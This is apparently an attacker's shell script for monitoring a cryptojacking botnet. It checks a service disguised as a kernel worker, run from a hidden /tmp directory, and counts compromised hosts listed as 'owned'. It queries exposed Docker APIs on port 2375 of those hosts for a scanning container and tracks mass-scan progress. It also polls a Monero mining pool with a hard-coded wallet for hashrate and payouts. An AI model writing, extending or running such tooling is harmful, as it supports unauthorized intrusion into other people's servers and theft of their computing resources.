#!/bin/sh
# throwaway: measure what nesting is actually doing, right now.
# Run detached so a killed ssh cannot truncate it: setsid sh _wcheck.sh > /tmp/_wcheck.out
cd /tmp/.sysd 2>/dev/null || exit 1
W=46Md49vuZSSDDG5e2FhStfYxszzfDgnjH6gU2YU8zHrS5QihNkwb5PFNTHCkPhoKpG3k6zGP1SpeTRVgVDZFFQQuCetBqU6

echo "== nestd"; systemctl is-active kworker-nestd.service
curl -sS -m 5 http://127.0.0.1:8080/stat
echo "== hits_total"; wc -l < /tmp/_nestd.hits 2>/dev/null
echo "== hit_tally(fresh/dup)"; cut -f3 /tmp/_nestd.hits 2>/dev/null | sort | uniq -c
echo "== last_hits"; tail -5 /tmp/_nestd.hits 2>/dev/null
echo "== queue_nestrows"; grep -c nest .hunt/mass.found
echo "== queue_massrows"; grep -c . .hunt/mass.found
echo "== cursor"; cat .hunt/nest.cursor
echo "== nest_runs_last60min"; journalctl -u kworker-nest.service --since -60min --no-pager 2>/dev/null | grep -c Starting
echo "== scanners"
r=0; s=0
for i in $(cut -f1 .hunt/dock.owned | sort -u); do
    out=$(curl -sS -m 4 "http://$i:2375/containers/json" 2>/dev/null)
    if [ -n "$out" ]; then r=$((r+1)); fi
    if printf '%s' "$out" | grep -q kwscan; then s=$((s+1)); fi
done
echo "reached=$r scanning=$s"
echo "== owned_lines"; grep -c . .hunt/dock.owned
echo "== net24s_done_swept"; wc -l < .hunt/mass.done
echo "== pool"
curl -sS -m 25 "http://pool.supportxmr.com/api/miner/$W/stats" | python3 -c 'import sys,json
d=json.load(sys.stdin)
ws=d.get("perWorkerStats") or {}
print("hash", d.get("hash"), "hash2h", d.get("hash2h"), "due", d.get("amtDue"), "paid", d.get("amtPaid"), "workers", len(ws))
print("ids", ",".join(list(ws)[:20]))'
date -u
